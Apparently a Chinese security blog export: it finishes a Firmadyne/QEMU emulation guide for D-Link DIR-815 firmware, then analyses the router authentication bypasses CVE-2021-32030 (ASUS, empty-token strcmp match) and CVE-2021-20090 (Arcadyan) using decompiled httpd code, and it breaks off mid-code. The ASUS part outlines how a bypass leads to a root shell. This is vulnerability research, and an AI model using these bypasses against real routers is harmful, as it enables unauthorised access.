<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">br0</span><br><span class="line"> bridge id		8000.000c29e5d458</span><br><span class="line"> designated root	8000.000c29e5d458</span><br><span class="line"> root port		   0			path cost		   0</span><br><span class="line"> max age		  20.00			bridge max age		  20.00</span><br><span class="line"> hello time		   1.00			bridge hello time	   1.00</span><br><span class="line"> forward delay		   1.00			bridge forward delay	   1.00</span><br><span class="line"> ageing time		 300.00</span><br><span class="line"> hello timer		   0.00			tcn timer		   0.00</span><br><span class="line"> topology change timer	   0.00			gc timer		 151.22</span><br><span class="line"> flags			</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ens33 (1)</span><br><span class="line"> port id		8001			state		     forwarding</span><br><span class="line"> designated root	8000.000c29e5d458	path cost		   4</span><br><span class="line"> designated bridge	8000.000c29e5d458	message age timer	   0.00</span><br><span class="line"> designated port	8001			forward delay timer	   0.00</span><br><span class="line"> designated cost	   0			hold timer		   0.00</span><br><span class="line"> flags			</span><br><span class="line"></span><br><span class="line">tap0 (2)</span><br><span class="line"> port id		8002			state		       disabled</span><br><span class="line"> designated root	8000.000c29e5d458	path cost		 100</span><br><span class="line"> designated bridge	8000.000c29e5d458	message age timer	   0.00</span><br><span class="line"> designated port	8002			forward delay timer	   0.00</span><br><span class="line"> designated cost	   0			hold timer		   0.00</span><br><span class="line"> flags			</span><br></pre></td></tr></table></figure></div>



<h2 id="启动命令"><a href="#启动命令" class="headerlink" title="启动命令"></a>启动命令</h2><p>将启动命令中网卡部分替换为我们自己配置的信息，得到新的启动命令</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">qemu-system-mipsel -m 256 -M malta -kernel /home/iot/Tools/firmadyne/binaries/vmlinux.mipsel -drive if=ide,format=raw,file=/home/iot/Tools/firmadyne/scratch/1/image.raw -append &quot;root=/dev/sda1 console=ttyS0 nandsim.parts=64,64,64,64,64,64,64,64,64,64 rdinit=/firmadyne/preInit.sh rw debug ignore_loglevel print-fatal-signals=1 user_debug=31 firmadyne.syscall=0&quot; -nographic -net nic -net tap,ifname=tap0,script=no,downscript=no</span><br></pre></td></tr></table></figure></div>

<p>虚拟机启动后在宿主机查看 br0 信息</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">tap0 (2)</span><br><span class="line"> port id		8002			state		     forwarding</span><br><span class="line"> designated root	8000.000c29e5d458	path cost		 100</span><br><span class="line"> designated bridge	8000.000c29e5d458	message age timer	   0.00</span><br><span class="line"> designated port	8002			forward delay timer	   0.00</span><br><span class="line"> designated cost	   0			hold timer		   0.00</span><br><span class="line"> flags			</span><br></pre></td></tr></table></figure></div>

<p>其中 tap0 的状态应该由 disabled 变成 forwarding。</p>
<p>在虚拟机中 ping 宿主机，发现还是无法连通，尝试启用 eth0 网卡，并赋予和宿主机 br0 相同网段的 IP</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ifconfig eth0 up</span><br><span class="line">ifconfig eth0 192.168.37.150 netmask 255.255.255.0</span><br><span class="line"></span><br><span class="line">配置后虚拟机 eth0 信息</span><br><span class="line"></span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 52:54:00:12:34:56  </span><br><span class="line">          inet addr:192.168.37.150  Bcast:192.168.37.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::5054:ff:fe12:3456/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:11 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:4 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:3355 (3.2 KiB)  TX bytes:408 (408.0 B)</span><br><span class="line">          Interrupt:10 Base address:0x1020 </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>配置好之后 ping 宿主机</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping 192.168.37.145</span><br><span class="line"></span><br><span class="line">输出信息</span><br><span class="line"></span><br><span class="line">ping 192.168.37.145</span><br><span class="line">192.168.37.145 is alive!</span><br></pre></td></tr></table></figure></div>

<p>至此我们成功解决了网络互通问题，但是在宿主机尝试访问 web 服务时，发现还是无法连接。</p>
<h2 id="配置分析"><a href="#配置分析" class="headerlink" title="配置分析"></a>配置分析</h2><p>首先查看默认环境下虚拟机开放的端口</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -tnlp</span><br><span class="line"></span><br><span class="line">输出信息</span><br><span class="line"></span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span><br><span class="line">tcp        0      0 192.168.0.1:49152       0.0.0.0:*               LISTEN      2105/httpd</span><br><span class="line">tcp        0      0 192.168.0.1:80          0.0.0.0:*               LISTEN      2105/httpd</span><br><span class="line">tcp        0      0 0.0.0.0:53              0.0.0.0:*               LISTEN      2118/dnsmasq</span><br><span class="line">tcp        0      0 0.0.0.0:63481           0.0.0.0:*               LISTEN      224/fakedns</span><br><span class="line">tcp        0      0 :::53                   :::*                    LISTEN      2118/dnsmasq</span><br><span class="line">tcp        0      0 :::63481                :::*                    LISTEN      224/fakedns</span><br></pre></td></tr></table></figure></div>

<p>可以看到 httpd 服务默认监听地址 192.168.0.1:80，然而 192.168.0.1 网段无法访问，所以访问 web 服务失败。</p>
<p>ps 看看 httpd 服务的启动命令</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps | grep 2105</span><br><span class="line"></span><br><span class="line">输出信息</span><br><span class="line"></span><br><span class="line">2105 root      1564 S    httpd -f /var/run/httpd.conf</span><br></pre></td></tr></table></figure></div>

<p>发现 httpd 具有一个 httpd.conf 的配置文件，内容如下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Umask 026</span><br><span class="line">PIDFile /var/run/httpd.pid</span><br><span class="line">#LogGMT On</span><br><span class="line">#ErrorLog /dev/console</span><br><span class="line"></span><br><span class="line">Tuning</span><br><span class="line">&#123;</span><br><span class="line">	NumConnections 15</span><br><span class="line">	BufSize 12288</span><br><span class="line">	InputBufSize 4096</span><br><span class="line">	ScriptBufSize 4096</span><br><span class="line">	NumHeaders 100</span><br><span class="line">	Timeout 60</span><br><span class="line">	ScriptTimeout 60</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Control</span><br><span class="line">&#123;</span><br><span class="line">	Types</span><br><span class="line">	&#123;</span><br><span class="line">		text/html	&#123; html htm &#125;</span><br><span class="line">		text/xml	&#123; xml &#125;</span><br><span class="line">		text/plain	&#123; txt &#125;</span><br><span class="line">		image/gif	&#123; gif &#125;</span><br><span class="line">		image/jpeg	&#123; jpg &#125;</span><br><span class="line">		text/css	&#123; css &#125;</span><br><span class="line">		application/octet-stream &#123; * &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	Specials</span><br><span class="line">	&#123;</span><br><span class="line">		Dump		&#123; /dump &#125;</span><br><span class="line">		CGI			&#123; cgi &#125;</span><br><span class="line">		Imagemap	&#123; map &#125;</span><br><span class="line">		Redirect	&#123; url &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	External</span><br><span class="line">	&#123;</span><br><span class="line">		/usr/sbin/phpcgi &#123; php &#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Server</span><br><span class="line">&#123;</span><br><span class="line">	ServerName &quot;Linux, HTTP/1.1, DIR-815 Ver 1.04&quot;</span><br><span class="line">	ServerId &quot;LAN-1&quot;</span><br><span class="line">	Family inet</span><br><span class="line">	Interface br0</span><br><span class="line">	Address 192.168.0.1</span><br><span class="line">	Port 80</span><br><span class="line">	Virtual</span><br><span class="line">	&#123;</span><br><span class="line">		AnyHost</span><br><span class="line">		Control</span><br><span class="line">		&#123;</span><br><span class="line">			Alias /</span><br><span class="line">			Location /htdocs/web</span><br><span class="line">			IndexNames &#123; index.php &#125;</span><br><span class="line">			External</span><br><span class="line">			&#123;</span><br><span class="line">				/usr/sbin/phpcgi &#123; txt &#125;</span><br><span class="line">			&#125;</span><br><span class="line">			External</span><br><span class="line">			&#123;</span><br><span class="line">				/usr/sbin/phpcgi &#123; router_info.xml &#125;</span><br><span class="line">				/usr/sbin/phpcgi &#123; post_login.xml &#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">        Control</span><br><span class="line">        &#123;</span><br><span class="line">           Alias /smart404</span><br><span class="line">           Location /htdocs/smart404</span><br><span class="line">        &#125;</span><br><span class="line">		Control</span><br><span class="line">		&#123;</span><br><span class="line">			Alias /HNAP1</span><br><span class="line">			Location /htdocs/HNAP1</span><br><span class="line">			External</span><br><span class="line">			&#123;</span><br><span class="line">				/usr/sbin/hnap &#123; hnap &#125;</span><br><span class="line">			&#125;</span><br><span class="line">			IndexNames &#123; index.hnap &#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">Server</span><br><span class="line">&#123;</span><br><span class="line">	ServerName &quot;Linux, HTTP/1.1, DIR-815 Ver 1.04&quot;</span><br><span class="line">	ServerId &quot;LAN-1&quot;</span><br><span class="line">	Family inet</span><br><span class="line">	Interface br0</span><br><span class="line">	Port 1900</span><br><span class="line">	Address 239.255.255.250</span><br><span class="line">	Datagrams On</span><br><span class="line">	Virtual</span><br><span class="line">	&#123;</span><br><span class="line">		AnyHost</span><br><span class="line">		Control</span><br><span class="line">		&#123;</span><br><span class="line">			Alias /</span><br><span class="line">			Location /htdocs/upnp/docs/LAN-1</span><br><span class="line">			External</span><br><span class="line">			&#123;</span><br><span class="line">				/htdocs/upnp/ssdpcgi &#123; * &#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Server</span><br><span class="line">&#123;</span><br><span class="line">	ServerName &quot;Linux, UPnP/1.0, DIR-815 Ver 1.04&quot;</span><br><span class="line">	ServerId &quot;LAN-1&quot;</span><br><span class="line">	Family inet</span><br><span class="line">	Interface br0</span><br><span class="line">	Address 192.168.0.1</span><br><span class="line">	Port 49152</span><br><span class="line">	Virtual</span><br><span class="line">	&#123;</span><br><span class="line">		AnyHost</span><br><span class="line">		Control</span><br><span class="line">		&#123;</span><br><span class="line">			Alias /</span><br><span class="line">			Location /htdocs/upnp/docs/LAN-1</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>设备的 web 服务被绑定在 br0 网卡上，我们需要修改配置文件，将 web 服务绑定在 eth0 网卡，监听地址 0.0.0.0:80。</p>
<p>修改 images&#x2F;1.tar.gz 在根目录下创建一个 fake.conf，内容如下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Umask 026</span><br><span class="line">PIDFile /var/run/httpd.pid</span><br><span class="line">#LogGMT On</span><br><span class="line">#ErrorLog /dev/console</span><br><span class="line"></span><br><span class="line">Tuning</span><br><span class="line">&#123;</span><br><span class="line">	NumConnections 15</span><br><span class="line">	BufSize 12288</span><br><span class="line">	InputBufSize 4096</span><br><span class="line">	ScriptBufSize 4096</span><br><span class="line">	NumHeaders 100</span><br><span class="line">	Timeout 60</span><br><span class="line">	ScriptTimeout 60</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Control</span><br><span class="line">&#123;</span><br><span class="line">	Types</span><br><span class="line">	&#123;</span><br><span class="line">		text/html	&#123; html htm &#125;</span><br><span class="line">		text/xml	&#123; xml &#125;</span><br><span class="line">		text/plain	&#123; txt &#125;</span><br><span class="line">		image/gif	&#123; gif &#125;</span><br><span class="line">		image/jpeg	&#123; jpg &#125;</span><br><span class="line">		text/css	&#123; css &#125;</span><br><span class="line">		application/octet-stream &#123; * &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	Specials</span><br><span class="line">	&#123;</span><br><span class="line">		Dump		&#123; /dump &#125;</span><br><span class="line">		CGI			&#123; cgi &#125;</span><br><span class="line">		Imagemap	&#123; map &#125;</span><br><span class="line">		Redirect	&#123; url &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	External</span><br><span class="line">	&#123;</span><br><span class="line">		/usr/sbin/phpcgi &#123; php &#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Server</span><br><span class="line">&#123;</span><br><span class="line">	ServerName &quot;Linux, HTTP/1.1, DIR-815 Ver 1.04&quot;</span><br><span class="line">	ServerId &quot;LAN-1&quot;</span><br><span class="line">	Family inet</span><br><span class="line">	Interface eth0</span><br><span class="line">	Address 0.0.0.0</span><br><span class="line">	Port 80</span><br><span class="line">	Virtual</span><br><span class="line">	&#123;</span><br><span class="line">		AnyHost</span><br><span class="line">		Control</span><br><span class="line">		&#123;</span><br><span class="line">			Alias /</span><br><span class="line">			Location /htdocs/web</span><br><span class="line">			IndexNames &#123; index.php &#125;</span><br><span class="line">			External</span><br><span class="line">			&#123;</span><br><span class="line">				/usr/sbin/phpcgi &#123; txt &#125;</span><br><span class="line">			&#125;</span><br><span class="line">			External</span><br><span class="line">			&#123;</span><br><span class="line">				/usr/sbin/phpcgi &#123; router_info.xml &#125;</span><br><span class="line">				/usr/sbin/phpcgi &#123; post_login.xml &#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">        Control</span><br><span class="line">        &#123;</span><br><span class="line">           Alias /smart404</span><br><span class="line">           Location /htdocs/smart404</span><br><span class="line">        &#125;</span><br><span class="line">		Control</span><br><span class="line">		&#123;</span><br><span class="line">			Alias /HNAP1</span><br><span class="line">			Location /htdocs/HNAP1</span><br><span class="line">			External</span><br><span class="line">			&#123;</span><br><span class="line">				/usr/sbin/hnap &#123; hnap &#125;</span><br><span class="line">			&#125;</span><br><span class="line">			IndexNames &#123; index.hnap &#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">Server</span><br><span class="line">&#123;</span><br><span class="line">	ServerName &quot;Linux, HTTP/1.1, DIR-815 Ver 1.04&quot;</span><br><span class="line">	ServerId &quot;LAN-1&quot;</span><br><span class="line">	Family inet</span><br><span class="line">	Interface eth0</span><br><span class="line">	Port 1900</span><br><span class="line">	Address 239.255.255.250</span><br><span class="line">	Datagrams On</span><br><span class="line">	Virtual</span><br><span class="line">	&#123;</span><br><span class="line">		AnyHost</span><br><span class="line">		Control</span><br><span class="line">		&#123;</span><br><span class="line">			Alias /</span><br><span class="line">			Location /htdocs/upnp/docs/LAN-1</span><br><span class="line">			External</span><br><span class="line">			&#123;</span><br><span class="line">				/htdocs/upnp/ssdpcgi &#123; * &#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Server</span><br><span class="line">&#123;</span><br><span class="line">	ServerName &quot;Linux, UPnP/1.0, DIR-815 Ver 1.04&quot;</span><br><span class="line">	ServerId &quot;LAN-1&quot;</span><br><span class="line">	Family inet</span><br><span class="line">	Interface eth0</span><br><span class="line">	Address 0.0.0.0</span><br><span class="line">	Port 49152</span><br><span class="line">	Virtual</span><br><span class="line">	&#123;</span><br><span class="line">		AnyHost</span><br><span class="line">		Control</span><br><span class="line">		&#123;</span><br><span class="line">			Alias /</span><br><span class="line">			Location /htdocs/upnp/docs/LAN-1</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>修改后重新制作镜像，并启动虚拟机。</p>
<p>启动后可以在根目录下看到 fake.conf，先 kill 掉 httpd 服务，之后以我们的配置文件重新启动 httpd。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">kill 2107</span><br><span class="line">httpd -f /fake.conf</span><br></pre></td></tr></table></figure></div>

<p>启动 httpd 后可看到它被绑定在 0.0.0.0:80</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span><br><span class="line">tcp        0      0 0.0.0.0:49152           0.0.0.0:*               LISTEN      3858/httpd</span><br><span class="line">tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      3858/httpd</span><br></pre></td></tr></table></figure></div>

<p>此时从宿主机访问 web 服务</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/firmadyne3-1.png"
                     
                ></p>
<p>至此固件模拟成功。</p>
]]></content>
      <categories>
        <category>MISC</category>
      </categories>
  </entry>
  <entry>
    <title>IoT 设备中身份验证绕过的一些漏洞(2)</title>
    <url>/2021/08/13/bypass_auth2/</url>
    <content><![CDATA[<p>CVE-2021-32030 &amp; CVE-2021-20090</p>
<span id="more"></span>

<h2 id="CVE-2021-32030"><a href="#CVE-2021-32030" class="headerlink" title="CVE-2021-32030"></a><strong>CVE-2021-32030</strong></h2><p>2021 年 5 月，来自 Atredis 的安全研究者披露了一个影响几乎所有 ASUS 路由器的身份验证绕过漏洞，利用该漏洞，未经授权的攻击者可以直接访问到后台管理接口，由于 ASUS 路由器在后台提供了开启 ssh 的功能，攻击者只需修改管理员密码并开启 ssh 即可获取 root shell。</p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>固件下载链接：<a class="link"   href="https://dlcdnets.asus.com/pub/ASUS/wireless/RT-AX56U/FW_RT_AX56U_30043848253.zip" >https://dlcdnets.asus.com/pub/ASUS/wireless/RT-AX56U/FW_RT_AX56U_30043848253.zip<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>我们以 RT-AX56U 为例，使用 binwalk 对固件解包(解包之后有可能只会得到一个 100000.ubi 文件，可以使用 ubi_reader 继续解包)。解包后在 &#x2F;usr&#x2F;sbin&#x2F; 目录下找到一个叫做 httpd 的程序，此程序用于处理用户发送的 HTTP 请求。</p>
<p>我们用 IDA 分析程序，搜索 httpd_handle_request 字符串可找到处理请求的入口位置，另外，由于 ASUS 路由器采用了一些开源组件，根据 GPL 规则，ASUS 在(数个版本之前)其官网发布了路由器的源代码，并且衍生出梅林等优秀的官改版固件，我们可以在 github 上找到 merlin 固件项目，利用<a class="link"   href="https://github.com/RMerl/asuswrt-merlin.ng/blob/6b60627c8c9c5c0271e956c914afb5277f81f9c4/release/src/router/httpd/httpd.c" >源代码<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>辅助分析。</p>
<p>httpd_handle_request 函数逻辑简述如下：</p>
<p>首先对请求进行简单解析，利用 strncasecmp 等字符串操作函数从用户请求中匹配出一些结构，并将这些数据赋值到对应的变量。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !strncasecmp(v4, <span class="string">&quot;Referer:&quot;</span>, <span class="number">8u</span>) )</span><br><span class="line">&#123;</span><br><span class="line">    stringp = v4 + <span class="number">8</span>;</span><br><span class="line">    v87 = &amp;stringp[<span class="built_in">strspn</span>(stringp, <span class="string">&quot; \t&quot;</span>)];</span><br><span class="line">    stringp = v87;</span><br><span class="line">    v20 = <span class="built_in">strlen</span>(v87);</span><br><span class="line">    v17 = v87;</span><br><span class="line">    v18 = v20 + <span class="number">1</span>;</span><br><span class="line">    LABEL_40:</span><br><span class="line">    v4 = &amp;v17[v18];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>然后过滤 URL，防止出现路径穿越。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v28 == <span class="number">47</span></span><br><span class="line">    || !<span class="built_in">strcmp</span>(v26, <span class="string">&quot;..&quot;</span>)</span><br><span class="line">    || !<span class="built_in">strncmp</span>(v26, <span class="string">&quot;../&quot;</span>, <span class="number">3u</span>)</span><br><span class="line">    || <span class="built_in">strstr</span>(v26, <span class="string">&quot;/../&quot;</span>)</span><br><span class="line">    || (v30 = <span class="built_in">strcmp</span>(&amp;v26[v29 - <span class="number">3</span>], <span class="string">&quot;/..&quot;</span>)) == <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">    v2 = <span class="string">&quot;Illegal filename.&quot;</span>;</span><br><span class="line">    v3 = <span class="string">&quot;Bad Request&quot;</span>;</span><br><span class="line">    LABEL_60:</span><br><span class="line">    v24 = <span class="number">400</span>;</span><br><span class="line">    <span class="keyword">return</span> sub_5ED20(v24, v3, v2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>之后根据用户访问的 URL 和 Method 执行不同逻辑，但所有需要身份验证的接口都要经过函数 auth_check(sub_5B560)，此函数从 Cookie 中获取 asus_token 参数的值，然后带入 sub_59588 进行检查</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_59588</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v2; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v3; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  v2 = nvram_get_1(<span class="string">&quot;ifttt_token&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(a1, v2) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( isFileExist(<span class="string">&quot;/tmp/IFTTT_ALEXA&quot;</span>) &gt; <span class="number">0</span> )</span><br><span class="line">      Debug2File(<span class="string">&quot;/tmp/IFTTT_ALEXA.log&quot;</span>, <span class="string">&quot;[%s:(%d)][HTTPD] IFTTT/ALEXA long token success.\n&quot;</span>, <span class="string">&quot;check_ifttt_token&quot;</span>, <span class="number">761</span>);</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( isFileExist(<span class="string">&quot;/tmp/IFTTT_ALEXA&quot;</span>) &gt; <span class="number">0</span> )</span><br><span class="line">      Debug2File(<span class="string">&quot;/tmp/IFTTT_ALEXA.log&quot;</span>, <span class="string">&quot;[%s:(%d)][HTTPD] IFTTT/ALEXA long token fail.\n&quot;</span>, <span class="string">&quot;check_ifttt_token&quot;</span>, <span class="number">767</span>);</span><br><span class="line">    <span class="keyword">if</span> ( isFileExist(<span class="string">&quot;/tmp/IFTTT_ALEXA&quot;</span>) &gt; <span class="number">0</span> )</span><br><span class="line">      Debug2File(</span><br><span class="line">        <span class="string">&quot;/tmp/IFTTT_ALEXA.log&quot;</span>,</span><br><span class="line">        <span class="string">&quot;[%s:(%d)][HTTPD] IFTTT/ALEXA long token is %s.\n&quot;</span>,</span><br><span class="line">        <span class="string">&quot;check_ifttt_token&quot;</span>,</span><br><span class="line">        <span class="number">768</span>,</span><br><span class="line">        a1);</span><br><span class="line">    <span class="keyword">if</span> ( isFileExist(<span class="string">&quot;/tmp/IFTTT_ALEXA&quot;</span>) &gt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = nvram_get_1(<span class="string">&quot;ifttt_token&quot;</span>);</span><br><span class="line">      Debug2File(<span class="string">&quot;/tmp/IFTTT_ALEXA.log&quot;</span>, <span class="string">&quot;[%s:(%d)][HTTPD] httpd long token is %s.\n&quot;</span>, <span class="string">&quot;check_ifttt_token&quot;</span>, <span class="number">769</span>, v3);</span><br><span class="line">    &#125;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们注意到函数先从配置文件中获取 ifttt_token 参数的值，然后将 asus_token 和它比较，如果两者相等，则输出</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">IFTTT/ALEXA long token success.</span><br></pre></td></tr></table></figure></div>

<p>同时返回 1，表示身份验证通过。</p>
<p>但是在设备的默认配置下，IFTTT 功能没有开启，这导致 ifttt_token 默认值为空， 此时如果用户传入的 asus_token 也是空值，则 strcmp 会返回 0 表示比较成功，这样就能绕过后续的检查，实现身份验证绕过。</p>
<p>新版 auth_check 函数将代码修改为</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *a1 &amp;&amp; *nvram_safe_get_0(<span class="string">&quot;ifttt_token&quot;</span>) &amp;&amp; (v2 = nvram_safe_get_0(<span class="string">&quot;ifttt_token&quot;</span>), !<span class="built_in">strcmp</span>(a1, v2)) )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( isFileExist(<span class="string">&quot;/tmp/IFTTT_ALEXA&quot;</span>) &gt; <span class="number">0</span> )</span><br><span class="line">        Debug2File(</span><br><span class="line">        <span class="string">&quot;/tmp/IFTTT_ALEXA.log&quot;</span>,</span><br><span class="line">        <span class="string">&quot;[%s:(%d)][HTTPD] IFTTT/ALEXA long token success.\n&quot;</span>,</span><br><span class="line">        <span class="string">&quot;check_ifttt_token&quot;</span>,</span><br><span class="line">        <span class="number">1020</span>);</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>首先判断 asus_token 是否为空，避免用户传入空值的情况出现，从而修复了此漏洞。</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a class="link"   href="https://www.atredis.com/blog/2021/4/30/asus-authentication-bypass" >https://www.atredis.com/blog/2021/4/30/asus-authentication-bypass<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="CVE-2021-20090"><a href="#CVE-2021-20090" class="headerlink" title="CVE-2021-20090"></a><strong>CVE-2021-20090</strong></h2><p>2021 年 4 月，Tenable 安全研究者披露了影响 Arcadyan 系列网络设备的一些漏洞，后续经确认，有多个厂商采用了 Arcadyan 开发的系统套件，从而遭受这些漏洞的影响。</p>
<h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>根据披露信息，Arcadyan 提供的组件被多个网络设备厂商使用，我们以 ASUS DSL-AC88U 为例进行分析。</p>
<p>固件版本：1.10.05_Build502，下载后 binwalk 即可解包。</p>
<p>关键文件：&#x2F;usr&#x2F;sbin&#x2F;httpd</p>
<p>IDA 加载分析，首先可以定位到名为 process_request 的函数，传入参数为解析后的 http 请求结构体，此函数关键代码如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">url_decode(&amp;req-&gt;url);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[%s] url=[%s], args=[%s], method=[%s]\n&quot;</span>, <span class="string">&quot;process_request&quot;</span>, &amp;req-&gt;url, req-&gt;args, req-&gt;method);</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">req-&gt;is_url_valid = sub_DEB0(&amp;req-&gt;url);</span><br><span class="line">v7 = *(off_54FAC[<span class="number">0</span>] + <span class="number">5</span>);</span><br><span class="line"><span class="keyword">if</span> ( (!v7 || v7(req) != <span class="number">2</span>) &amp;&amp; (req-&gt;is_url_valid || !check_auth_0(&amp;req-&gt;url, <span class="number">0</span>, req)) )</span><br><span class="line">&#123;</span><br><span class="line">    req-&gt;dword798C = <span class="number">0</span>;</span><br><span class="line">    v8 = req-&gt;method;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v8, <span class="string">&quot;HEAD&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">        req-&gt;dword798C = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( req-&gt;dword7988 )</span><br><span class="line">        &#123;</span><br><span class="line">            req-&gt;dword798C = <span class="number">0</span>;</span><br><span class="line">            LOG(req, <span class="number">400</span>, <span class="string">&quot;Invalid HTTP/0.9 method.&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_19;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v8, <span class="string">&quot;GET&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">        LABEL_19:</span><br><span class="line">        process_get(req);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v8, <span class="string">&quot;POST&quot;</span>) )</span><br><span class="line">        process_post(req);</span><br><span class="line">    <span 